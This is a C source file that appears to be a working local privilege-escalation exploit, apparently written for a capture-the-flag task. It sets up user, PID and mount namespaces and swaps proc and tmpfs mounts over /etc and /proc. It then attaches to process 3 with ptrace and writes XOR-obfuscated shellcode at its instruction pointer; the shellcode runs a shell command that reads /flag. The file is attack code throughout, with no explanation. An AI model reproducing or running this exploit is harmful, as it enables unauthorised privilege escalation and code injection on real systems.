#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <err.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/user.h>

#include "util.h"

void write_proc(const char *fname, const char *data) {
  char path[4096] = "";
  snprintf(path, sizeof(path), "/proc/self/%s", fname);
  int fd = check(open(path, O_WRONLY), "open xidmap");
  if (write(fd, data, strlen(data)) != strlen(data)) {
    err(1, "write");
  }
  close(fd);
}

void ptrace_copy(pid_t pid, unsigned long addr, const char *data, size_t size) {
  while (1) {
    printf("[*] ptrace: %ld\n", ptrace(PTRACE_POKETEXT, pid, addr, *(unsigned long *)data));
    fflush(stdout);
    if (size < 8) {
      break;
    }
    size -= 8;
    data += 8;
    addr += 8;
  }
}

int main(int argc, char *argv[]) {
  //check(unshare(CLONE_NEWUSER|CLONE_NEWPID|CLONE_NEWNS|CLONE_NEWIPC|CLONE_NEWUTS|CLONE_NEWCGROUP), "unshare");
  if (unshare(CLONE_NEWUSER|CLONE_NEWPID|CLONE_NEWNS|CLONE_NEWIPC|CLONE_NEWUTS|CLONE_NEWCGROUP) == -1) {
    perror("[*] unshare failed");
    getchar();
    return -1;
  }
  puts("[*] unshare worked");

  write_proc("setgroups", "deny");
  write_proc("uid_map", "0 1 1");
  write_proc("gid_map", "0 1 1");

  puts("[*] wrote idmaps");

  if (!check(fork(), "fork")) {
    check(mount("", "/etc", "proc", 0, ""), "mount(proc)");
    check(mount("", "/proc", "tmpfs", 0, ""), "mount(tmp)");
    for (int i = 1; i < 60000; i++) {
      char proc_dir[4096];
      snprintf(proc_dir, sizeof(proc_dir), "/proc/%d", i);
      check(symlink("/etc/1", proc_dir), "symlink");
    }
    puts("[*] symlinks created");
    sleep(3600);
    return 0;
  }
  puts("[*] forked");

  int victim = 3;

  while (kill(victim, SIGSTOP) != 0) {
    ;
  }

  puts("[*] stopped!");
  printf("[*] ptrace: %ld\n", ptrace(PTRACE_ATTACH, victim, 0, 0));

  struct user_regs_struct regs;

  //const char sc[] = "\xeb\xfe";
  const char sc[] = "\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x75\x21\x2e\x67\x6d\x60\x66\x01\x48\x31\x04\x24\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x72\x69\x01\x2c\x62\x01\x62\x60\x48\x31\x04\x24\x31\xf6\x56\x6a\x0e\x5e\x48\x01\xe6\x56\x6a\x13\x5e\x48\x01\xe6\x56\x6a\x18\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05";

  sleep(1);
  ptrace(PTRACE_GETREGS, victim, 0, &regs);

  printf("[*] rip: %llx\n", regs.rip);
  ptrace_copy(victim, regs.rip, sc, sizeof(sc));
  printf("[*] detach: %ld\n", ptrace(PTRACE_DETACH, victim, 0, 0));
  printf("[*] kill cont: %d\n", kill(victim, SIGCONT));

  sleep(10);
  puts("[*] exiting");

  //getchar();

  return 0;
}
